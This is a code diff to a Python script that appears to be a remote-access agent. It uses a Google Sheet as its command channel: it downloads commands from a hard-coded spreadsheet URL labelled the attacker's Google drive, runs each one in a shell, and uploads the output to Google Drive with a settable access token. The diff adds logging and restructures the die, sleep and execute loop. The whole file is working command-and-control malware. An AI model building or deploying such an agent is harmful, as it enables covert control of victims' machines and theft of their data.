@@ -131,10 +131,14 @@ if __name__ == '__main__':
     oldCommands = []
     interval = 5
     access_token = ""
+    dieFlag = 0
     while True:
-        time.sleep(interval)
-
+        print("[*] Awaking ...")
         # fetch commands
+        print("[*] Fetching commands from attacker's Google drive ...")
+
+        # change to your link of sheet file in csv format
+        # url = {file_link}/{file_id}/export?format=csv&id={file_id}
         url = 'https://docs.google.com/spreadsheets/u/3/d/1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ/export?format=csv&id=1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ&gid=0'
         output = 'commands'
         gdown.download(url, output, quiet=True)
@@ -145,32 +149,45 @@ if __name__ == '__main__':
                 commands.append(line.strip())
         # print(commands)
 
+        # avoid same upload operations
         if commands == oldCommands:
-            # print("commands were not changed !")
+            print(f"[*] Same commands received. Going to sleep for {interval} second ...")
             continue
         else: oldCommands = commands
 
-        outputs = []
-        for command in commands:
-            if command == 'die': sys.exit()
-            elif 'sleep ' in command:
-                interval = int(command[6:])
-                outputs.append(f"sleep interval was changed to {interval} sec.\n")
-            elif 'token ' in command:
-                access_token = command[6:]
-                outputs.append(f"access token was changed to {access_token}.\n")
-            else:
-                pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                res = pipe.communicate()
-                if res[1]: outputs.append(res[1].decode())
-                else: outputs.append(res[0].decode())
-
         with open('outputs.txt', 'w') as f:
-            for command, output in zip(commands, outputs):
-                f.write(f'> {command}\n{output}\n')
+            for command in commands:
+                f.write(f'\n> {command}\n')
+                if command == 'die':
+                    dieFlag = 1
+                    print("[*] Ready to die ...") 
+                    f.write(f'Agent is dead.\n')
+                    break
+                elif 'sleep ' in command:
+                    interval = int(command[6:])
+                    print(f"[*] Setting sleep interval to {interval} second ...")
+                    f.write(f"Sleep interval was set to {interval} second.\n")
+                elif 'token ' in command:
+                    access_token = command[6:]
+                    print(f"[*] Setting access token to \"{access_token}\" ...")
+                    f.write(f"Access token was set to \"{access_token}\".\n")
+                else:
+                    print(f"[*] Executing \"{command}\" ...")
+                    pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    res = pipe.communicate()
+                    if res[1]: f.write(res[1].decode())
+                    else: f.write(res[0].decode())
 
         try:
+            print(f"[*] Uploading output.txt ...")
             upload(is_update_file_function=bool(True), update_drive_service_name='outputs.txt', update_file_path=os.getcwd() + '/', access_token=access_token)
         except:
-            print("invalid access token")
-            interval = 5
+            print("[*] Invalid access token ...")
+
+        if dieFlag: 
+            print("[*] Dying ...")
+            sys.exit()
+
+        print(f"[*] Going to sleep for {interval} second ...")
+        time.sleep(interval)
+        
